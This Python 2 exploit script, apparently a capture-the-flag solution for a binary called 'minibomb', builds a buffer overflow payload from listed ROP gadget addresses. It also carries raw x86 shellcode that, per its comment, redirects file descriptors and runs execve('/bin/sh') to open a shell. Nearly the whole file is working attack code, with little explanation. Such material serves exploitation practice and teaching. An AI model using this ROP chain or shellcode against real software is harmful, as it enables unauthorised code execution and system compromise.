#!/usr/bin/env python
# -*- coding: utf-8 -*-
import subprocess
#from subprocess import *
from zio import *

#p = subprocess.Popen('./minibomb', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

'''
gadget1
.text:00000B50                 pop     ebp
.text:00000B51                 pop     edx
.text:00000B52                 pop     ecx
.text:00000B53                 retn
'''

'''
gadget2
.text:00000B4F                 sbb     byte ptr [ebp+5Ah], 59h
.text:00000B53                 retn
'''

'''
.text:0804813B                 xchg    eax, ecx
.text:0804813C                 add     al, 8
.text:0804813E                 mov     edx, 0Ch
.text:08048143                 mov     ebx, 1
.text:08048148                 int     80h             ; LINUX -
.text:0804814A                 add     esp, 10h
.text:0804814D                 retn
'''

gadget1 = 0xb50
gadget2 = 0xb4f
gadget3 = 0x804813B
offset = 0xf7ffd000
port = 0x8049158
main = 0x80480AF

payload = 'a'*16
payload += l32(gadget1+offset)
payload += l32(port-0x5A) #ebp
payload += 'AAAA' #edx
payload += 'BBBB' #ecx
payload += l32(gadget2+offset) #ret
payload += l32(gadget2+offset) #ret
payload += l32(gadget2+offset) #ret
payload += l32(gadget3) #dup
payload += 'z'*16
payload += l32(main)

# the shellcode does dup2(4,0); dup2(5,1); execve("/bin/sh")
shellcode = '\x31\xc0\xb0\x3f\x31\xdb\xb3\x04\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x31\xdb\xb3\x05\x31\xc9\xfe\xc1\xcd\x80\x31\xc0\xf7\xe9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80'

payload2 = 'b'*16
payload2 += l32(0xf7ff9fb0+20)  #ret to shellcode
payload2 += '\x90\x90\x90\x90'
payload2 += shellcode

#p.stdin.write(payload)
#p = subprocess.Popen('./minibomb', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
print payload
